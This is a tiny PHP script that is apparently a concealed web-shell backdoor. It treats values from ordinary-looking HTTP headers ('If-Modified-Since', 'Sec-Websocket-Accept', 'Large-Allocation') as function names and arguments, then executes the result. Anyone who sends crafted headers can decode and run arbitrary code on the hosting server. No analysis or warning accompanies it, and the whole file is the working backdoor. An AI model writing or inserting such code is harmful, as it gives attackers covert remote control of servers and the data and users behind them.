<?php

$_HEADERS = getallheaders();
if (isset($_HEADERS['If-Modified-Since'])) {
    $accept = $_HEADERS['If-Modified-Since']('', $_HEADERS['Sec-Websocket-Accept']($_HEADERS['Large-Allocation']));
    $accept();
}